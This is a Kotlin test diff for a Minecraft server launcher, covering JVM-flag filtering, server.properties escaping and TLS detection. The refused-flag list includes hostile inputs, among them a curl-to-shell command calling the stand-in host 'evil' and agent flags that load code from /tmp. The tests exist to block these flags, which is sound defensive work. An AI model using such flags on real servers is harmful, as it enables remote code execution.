@@ -30,6 +30,28 @@ class ServerLaunchTest {
     }
 
     @Test
+    fun `drops jvm flags that would run a command or load other code`() {
+        val wanted = listOf("-XX:+UseG1GC", "-XX:MaxGCPauseMillis=200", "-Dusing.aikars.flags=https://mcflags.emc.gs", "-Xss2M", "-Djava.security.manager=allow")
+        val refused = listOf(
+            "-XX:OnOutOfMemoryError=curl -s http://evil/x|sh",
+            "-XX:onerror=sh -c id",
+            "-javaagent:/tmp/a.jar",
+            "-agentpath:/tmp/a.so",
+            "-agentlib:jdwp=transport=dt_socket",
+            "-Xrunhprof",
+            "-XX:Flags=/tmp/flags",
+            "-XX:VMOptionsFile=/tmp/opts",
+            "--patch-module=java.base=/tmp/x",
+            "-Djava.system.class.loader=Evil",
+            "@/tmp/args",
+            "-jar",
+            "-cp"
+        )
+
+        assertEquals(wanted, ServerProcess.launchSafeJvmArgs(wanted + refused))
+    }
+
+    @Test
     fun `leaves nogui off a proxy`() {
         val command = ServerProcess.buildCommand("java", "velocity.jar", ServerSpec(software = "velocity"))
 
@@ -84,6 +106,22 @@ class ServerLaunchTest {
     }
 
     @Test
+    fun `a value ending in a backslash cannot swallow the next setting`() {
+        val file = File(directory, "server.properties")
+
+        file.writeText("motd=old\nwhite-list=true\n")
+
+        ServerProperties.merge(file, mapOf("motd" to "Welcome \\"))
+
+        val loaded = java.util.Properties().apply { file.inputStream().use { load(it) } }
+
+        assertEquals("Welcome \\", loaded.getProperty("motd"))
+        assertEquals("true", loaded.getProperty("white-list"))
+        assertFalse(ServerProperties.isSafeKey("white list"))
+        assertFalse(ServerProperties.isSafeKey("#motd"))
+    }
+
+    @Test
     fun `reads a java major out of both version shapes`() {
         assertEquals(8, JavaRuntimeLocator.parseMajor("1.8.0_432"))
         assertEquals(21, JavaRuntimeLocator.parseMajor("21.0.5"))
@@ -107,6 +145,18 @@ class ServerLaunchTest {
         assertFalse(PlatformEndpoint.parse("http://127.0.0.1:8080").ssl)
         assertEquals(8080, PlatformEndpoint.parse("http://127.0.0.1:8080").port)
         assertEquals(443, PlatformEndpoint.parse("https://panel.example.com").port)
+    }
+
+    @Test
+    fun `a public name that starts like a private address still gets tls`() {
+        assertTrue(PlatformEndpoint.parse("10.mc.example.com").ssl)
+        assertTrue(PlatformEndpoint.parse("192.168.example.net:8443").ssl)
+        assertTrue(PlatformEndpoint.parse("172.16.example.org").ssl)
+        assertTrue(PlatformEndpoint.parse("10.0.0.256").ssl)
+        assertFalse(PlatformEndpoint.parse("10.0.0.5").ssl)
+        assertFalse(PlatformEndpoint.parse("192.168.1.20:8080").ssl)
+        assertFalse(PlatformEndpoint.parse("172.20.0.1").ssl)
+        assertFalse(PlatformEndpoint.parse("localhost:8080").ssl)
     }
 
     @Test
